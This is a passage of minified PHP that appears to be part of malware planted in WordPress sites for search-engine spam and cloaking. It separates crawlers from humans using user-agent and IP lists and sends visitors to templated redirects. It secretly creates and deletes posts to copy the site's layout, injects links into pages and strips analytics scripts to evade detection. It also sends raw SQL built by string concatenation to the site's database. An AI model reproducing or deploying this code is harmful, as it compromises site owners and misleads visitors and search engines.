WebZIP#i','#Wget#i','#Yandex#i','#Yanga#i','#Yeti#i','#msnbot#i','#spider#i','#yahoo#i','#jeeves#i','#googlebot#i','#altavista#i','#scooter#i','#av\s*fetch#i','#asterias#i','#spiderthread revision#i','#sqworm#i','#ask#i','#lycos.spider#i','#infoseek sidewinder#i','#ultraseek#i','#polybot#i','#webcrawler#i','#robozill#i','#gulliver#i','#architextspider#i','#yahoo!\s*slurp#i','#charlotte#i','#bingbot#i');$stop_ips_masks=array("66\.249\.[6-9][0-9]\.[0-9]","74\.125\.[0-9]\.[0-9]","65\.5[2-5]\.[0-9]\.[0-9]","74\.6\.[0-9]\.[0-9]","67\.195\.[0-9]\.[0-9]","72\.30\.[0-9]\.[0-9]","38\.[0-9]\.[0-9]\.[0-9]","93\.172\.94\.227","212\.100\.250\.218","71\.165\.223\.134","70\.91\.180\.25","65\.93\.62\.242","74\.193\.246\.129","213\.144\.15\.38","195\.92\.229\.2","70\.50\.189\.191","218\.28\.88\.99","165\.160\.2\.20","89\.122\.224\.230","66\.230\.175\.124","218\.18\.174\.27","65\.33\.87\.94","67\.210\.111\.241","81\.135\.175\.70","64\.69\.34\.134","89\.149\.253\.169","104\.132\.8\.69");foreach($stop_ips_masks as $k => $v){if(preg_match('#^' .$v .'$#',$ip)){$is_bot="bot";}}if(empty($is_bot)&& strpos("qqq" .preg_replace($user_agent_to_filter,'-ANGRYBOT-',$ua),'-ANGRYBOT-')){$is_bot="bot";}if($is_bot=="bot"){return $is_bot;}if(!empty($forlinks)){return "";}if(!empty($plainred)){if(!empty($plainredurl)){$plainred=str_ireplace("[REDIRECTURL]",$plainredurl,$plainred);}$plainred=str_ireplace("[DEFISKEY]",str_ireplace(" ","-",$keyword),$plainred);$plainred=str_ireplace("[SPACEKEY]",$keyword,$plainred);$plainred=str_ireplace("[CURRURL]",$url_curr,$plainred);$plainred=str_ireplace("[REFERER]",$referrer,$plainred);$plainred=str_ireplace("[MULTIKEYREDIRECT]",$key1,$plainred);return $plainred;}else{return "";}}return "";}function updateBDData($tablename,$data,$value,$uslovie,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return false;}else{$sql="UPDATE " .$tablename ." SET $value='" .$data ."' WHERE " .$uslovie ."";if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return "yes";}else{mysqli_close($dbcon);return false;}}}function placeLinks($pageurl,$links){$page=httpGet($pageurl);if(!empty($page)){$page=preg_replace("/(<body.*>)/","\$1" .$links,$page,1);return $page;}else{return "";}}function randomValuesFromTableById($tablename,$value,$count,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}else{$sql="SELECT " .$value ." FROM " .$tablename ." WHERE wpk IS NOT NULL ORDER BY RAND() LIMIT " .$count;$needvalue=mysqli_query($dbcon,$sql);$res=array();$out=array();$value=explode(",",$value);while($row=mysqli_fetch_array($needvalue)){foreach($value as $k=>$onevalue){$onevalue=trim($onevalue);$res[$onevalue]=$row[$onevalue];}$out[]=$res;}mysqli_close($dbcon);return $out;}}function getCountofTable($tablename,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return false;}else{$sql="SELECT COUNT(1) FROM " .$tablename;$count=mysqli_query($dbcon,$sql);$count=mysqli_fetch_array($count);mysqli_close($dbcon);if(!empty($count[0])){return $count[0];}else{return "no";}}}function deleteLinesFmDB($tablename,$uslovie,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return false;}else{$sql="DELETE FROM " .$tablename ." WHERE " .$uslovie;mysqli_query($dbcon,$sql);mysqli_close($dbcon);return "yes";}}function randomUA(){$uas=array("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)");$uas=shuffleArr($uas);return $uas[0];}function shuffleArr($arr){srand((float)microtime()*1000000);shuffle($arr);return $arr;}function parseTemplate(){$slugname=randString(8);$post_data=array("post_title"=> "[HER" ."EISP" ."OSTTI" ."TLE]","post_name"=> $slugname,"post_content"=> "[HERE" ."ISC" ."ONT" ."ENT]",'post_status'=> 'publish','post_category'=> array());$post_id=wp_insert_post($post_data,true);$permalink=get_permalink($post_id);$permalink=str_ireplace('http://','',$permalink);$permalink=str_ireplace('https://','',$permalink);if(is_ssl()=== false){$permalink="http://" .$permalink;}else{$permalink="https://" .$permalink;}$sitecode=httpGet($permalink);$permalink=trim($permalink,"/");if(stripos("qqq" .$permalink,"?p=")){$urlfrchpu=str_ireplace("?p=" .$post_id,"?p=chpukeyplace",$permalink);}else{$urlfrchpu=str_ireplace($slugname,"chpukeyplace",$permalink);}wp_delete_post($post_id,true);if(!empty($sitecode)){$regular="|<title>(.*)<\/title>|iUs";preg_match_all($regular,$sitecode,$matches);if(!empty($matches[1])){$matches[1]=array_unique($matches[1]);foreach($matches[1]as $pagetitlemain){$sitecode=str_ireplace($pagetitlemain,'[HE' .'REI' .'SPAG' .'ETI' .'TLE]',$sitecode);}}$regular="|(<h2.*>.*</h2+>)|iUs";preg_match_all($regular,$sitecode,$matches);if(!empty($matches[1])){$matches[1]=array_unique($matches[1]);srand((float)microtime()*1000000);shuffle($matches[1]);if(count($matches[1])>= 2){$counth=count($matches[1])/2;$counth=floor($counth);$matches[1]=array_slice($matches[1],0,$counth-1);}foreach($matches[1]as $htagmain){$sitecode=str_ireplace($htagmain,'[HE' .'R' .'EI' .'SH' .'TAG]',$sitecode);}}$regular="|<a\s.*(href=[\"']+.*[\"']+).*>(.*)<\/a>|iUs";preg_match_all($regular,$sitecode,$matches);if(!empty($matches[1])){$all_links=$matches[0];$atagarray=array_combine($matches[2],$matches[1]);$atagarray=array_unique($atagarray);foreach($atagarray as $anchor => $url){if(stripos("qqq" .$url,"feed")|| stripos("qqq" .$url,"wp-login")|| stripos("qqq" .$url,"#")||(stripos("qqq" .$anchor,"<")&& stripos("qqq" .$anchor,">"))){unset($atagarray[$anchor]);}}srand((float)microtime()*1000000);shuffle($atagarray);if(count($atagarray)>= 3){$counta=count($atagarray)/3;$counta=floor($counta);$atagarray=array_slice($atagarray,0,$counta-1);}foreach($all_links as $atagmain){foreach($atagarray as $url){if(stripos("qqq" .$atagmain,$url)){$atagtoreplace=preg_replace("/href=[\"']+.*[\"']+/iUs","href=\"[H" ."ER" ."EIS" ."AT" ."AGL" ."INK]\"",$atagmain);$atagtoreplace=preg_replace("/>.*<\/a>/iUs",">[HE" ."REIS" ."AT" ."AGA" ."NCH" ."OR]</a>",$atagtoreplace);$sitecode=str_ireplace($atagmain,$atagtoreplace,$sitecode);}}}}$sitecode=str_ireplace($permalink,"#",$sitecode);$sitecode=preg_replace("/<meta property=[\"']{1}og:description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs","",$sitecode);$sitecode=preg_replace("/<meta property=[\"']{1}og:title[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs","",$sitecode);$sitecode=preg_replace("/<meta name=[\"']{1}twitter:description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs","",$sitecode);$sitecode=preg_replace("/<meta itemprop=[\"']{1}description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs","",$sitecode);$sitecode=preg_replace("/<meta name=[\"']{1}description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs","",$sitecode);$sitecode=preg_replace("/<meta name=[\"']{1}dc\.description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs","",$sitecode);$sitecode=urlencode($sitecode);$regular="|(%3Cscript.*%3C%2Fscript%3E)|iUs";preg_match_all($regular,$sitecode,$matches);if(!empty($matches[1])){foreach($matches[1]as $currgooglestat){if(stripos("qqq" .$currgooglestat,"google-analytics.com")|| stripos("qqq" .$currgooglestat,"yandex.ru")){$sitecode=str_ireplace($currgooglestat,"",$sitecode);}}}if(!empty($sitecode)){$resultarray=array("chpu"=> $urlfrchpu,"sitetemp"=> $sitecode);return $resultarray;}}return false;}function httpGet($url){if(stripos("qqq" .$url,"?")){$url=$url ."&ertthndxbcvs=yes";}else{$url=$url ."?ertthndxbcvs=yes";}if(function_exists('curl_init')){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_USERAGENT,randomUA());curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_TIMEOUT,90);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);$output=curl_exec($ch);curl_close($ch);}else{$output=file_get_contents($url);}return $output;}function httpPost($url,$params){$params=rtrim($params,'&');if(function_exists('curl_init')){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_USERAGENT,randomUA());curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_HEADER,false);curl_setopt($ch,CURLOPT_POSTFIELDS,$params);curl_setopt($ch,CURLOPT_TIMEOUT,40);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);$output=curl_exec($ch);curl_close($ch);}else{$output=file_get_contents($url,false,stream_context_create(array('http'=> array('method'=> 'POST','header'=> 'Content-type: application/x-www-form-urlencoded','content'=> $params))));}return $output;}function readValueFromBD($tablename,$value,$uslovie,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}else{if(!empty($uslovie)){$sql="SELECT " .$value ." FROM " .$tablename ." where " .$uslovie;}else{$sql="SELECT " .$value ." FROM " .$tablename;}$needvalue=mysqli_query($dbcon,$sql);$needvalue=mysqli_fetch_array($needvalue);if(!empty($needvalue)){if(!empty($uslovie)){if(stripos($value,",")){$value=explode(",",$value);$res=array();foreach($value as $onevalue){$onevalue=trim($onevalue);$res[$onevalue]=$needvalue[$onevalue];}$needvalue=$res;}else{$needvalue=$needvalue[$value];}}mysqli_close($dbcon);return $needvalue;}else{mysqli_close($dbcon);return "no";}}}function insertToBD($tablename,$cols,$data,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}else{$sql="INSERT INTO " .$tablename ." (" .$cols .") VALUES (" .$data .")";if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return "yes";}else{mysqli_close($dbcon);return "bewiursfer9uidd";}}}function mysqlTableSeekWP($tablename,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}$table_list=mysqli_query($dbcon,"SHOW TABLES FROM " .$dbname ."");while($row=mysqli_fetch_row($table_list)){if($tablename == $row[0]){mysqli_close($dbcon);unset($row);unset($table_list);return "yes";}}mysqli_close($dbcon);unset($row);unset($table_list);return "no";}function randString($length){$str="";$chars="abcdefghijklmnopqrstuvwxyz0123456789";$size=strlen($chars);for($i=0;$i<$length;$i++){$str .= $chars[rand(0,$size-1)];}return $str;}function createTable($tablename,$fields,$idfield,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}$table_list=mysqli_query($dbcon,"SHOW TABLES FROM " .$dbname ."");while($row=mysqli_fetch_row($table_list)){if($tablename == $row[0]){mysqli_close($dbcon);return "aawtr35tdgvvcsxdff";}}unset($row);unset($table_list);$sql="CREATE TABLE " .$tablename ." ($fields)";mysqli_query($dbcon,$sql);$sql="ALTER TABLE " .$tablename ." add " .$idfield ." INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY FIRST";mysqli_query($dbcon,$sql);$table_list=mysqli_query($dbcon,"SHOW TABLES FROM " .$dbname ."");while($row=mysqli_fetch_row($table_list)){if($tablename == $row[0]){mysqli_close($dbcon);unset($row);unset($table_list);return "yes";}}mysqli_close($dbcon);return "bewiursfer9uidd";}